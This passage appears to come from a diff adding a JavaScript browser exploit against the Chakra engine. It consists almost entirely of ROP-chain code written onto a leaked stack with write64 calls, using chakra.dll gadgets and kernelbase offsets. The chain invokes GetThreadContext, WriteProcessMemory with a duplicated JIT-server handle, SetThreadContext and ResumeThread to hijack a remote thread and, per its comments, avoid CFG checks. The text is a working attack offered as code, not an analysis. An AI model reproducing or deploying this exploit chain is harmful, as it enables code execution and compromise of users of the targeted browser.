+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1a20b2, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1a20b2, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1a20b2, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);        // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.ContextFlags
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3bf711, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
+    next();
+
+    // We need to set CONTEXT.ContextFlags. This address (0x30 offset from CONTEXT buffer allocated from VirtualAlloc) is in kernelbase+0x21a110
+    // The value we need to set is 0x10001F
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);        // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll with CONTEXT.ContextFlags address
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x0010001F, 0x00000000);             // CONTEXT_ALL
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3bf711, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
+    next();
+
+    // HANDLE hThread
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future mov qword [rax+0x20], rcx gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
+    next();
+
+    // LPCONTEXT lpContext
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
+    next();                                                                      
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x259834, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
+    next();
+
+    // Call KERNELBASE!GetThreadContext
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x72d10, kernelbaseHigh); // KERNELBASE!GetThreadContext address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!GetThreadContext)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);       // "return address" for KERNELBASE!GetThreadContext - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+
+    // Locate store CONTEXT.Rsp and store it in .data of kernelbase.dll
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);        // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we stored CONTEXT.ContextFlags
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4c2d85, chakraHigh);		// 0x1804c37c5: mov rax, qword [rcx] ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x2731ba, chakraHigh);       // 0x18026f73a: add rax, 0x68 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);        // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a118, kernelbaseHigh); // .data section of kernelbase.dll where we want to store CONTEXT.Rsp
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313fd9, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
+    next();
+
+    // Update CONTEXT.Rip to point to a ret gadget directly instead of relying on CreateRemoteThread start routine (which CFG checks)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x2731aa, chakraHigh);      // 0x18026f72a: add rax, 0x60 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next(); //here
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x0025983b, chakraHigh);	   // ret gadget we want to overwrite our remote thread's RIP with 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x54b479, chakraHigh);        // 0x18000feab: mov qword [rax], rcx ; ret  (Context.Rip = ret_gadget)
+    next();
+
+    // WriteProcessMemory() ROP chain (Number 4)
+    // Stage 9 -> Write our ROP chain to the remote process, using the JIT handle and the leaked stack via GetThreadContext()
+
+    // SIZE_T nSize (R9)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000100, 0x00000000);             // SIZE_T nSize (0x100) (CONTEXT.Rsp is writable and a "full" stack, so 0x100 is more than enough)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // LPVOID lpBaseAddress (RDX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a118-0x08, kernelbaseHigh);      // .data section of kernelbase.dll where CONTEXT.Rsp resides
+    next();                                                                      
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x259834, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret (Pointer to CONTEXT.Rsp)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x5287ee, chakraHigh);      // 0x18026ef31: mov rax, qword [rax] ; ret (get CONTEXT.Rsp)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4354b1, chakraHigh);      // 0x180435f21: mov rdx, rax ; mov rax, rdx ; add rsp, 0x28 ; ret (RAX and RDX now both have CONTEXT.Rsp)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // LPCVOID lpBuffer (R8)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x37193d, chakraHigh);      // 0x180576231: pop r8 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropBegin, chakraHigh);      // .data section of chakra.dll where our ROP chain is
+    next();
+
+    // HANDLE hProcess (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e030, chakraHigh);      // .data pointer from chakra.dll which holds the full perms handle to JIT server
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
+    next();                                                                     // Recall RAX already has a writable pointer in it  
+
+    // Call KERNELBASE!WriteProcessMemory
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x20)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    // SetThreadContext() ROP chain
+    // Stage 10 -> Update our remote thread's RIP to return execution into our VirtualProtect ROP chain
+
+    // HANDLE hThread (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);        // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
+    next();
+
+    // const CONTEXT *lpContext
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
+    next();                                                                      
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x259834, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
+    next();
+
+    // Call KERNELBASE!SetThreadContext
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x7aa0, kernelbaseHigh); // KERNELBASE!SetThreadContext address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!SetThreadContext)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);       // "return address" for KERNELBASE!SetThreadContext - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+
+    // ResumeThread() ROP chain
+    // Stage 11 -> Resume the thread, with RIP now pointing to a return into our ROP chain
+
+    // HANDLE hThread (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);        // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
+    next();
+
+    // Call KERNELBASE!ResumeThread
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x70a50, kernelbaseHigh); // KERNELBASE!ResumeThread address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!ResumeThread)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);       // "return address" for KERNELBASE!ResumeThread - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
+    next();
+}
+</script>
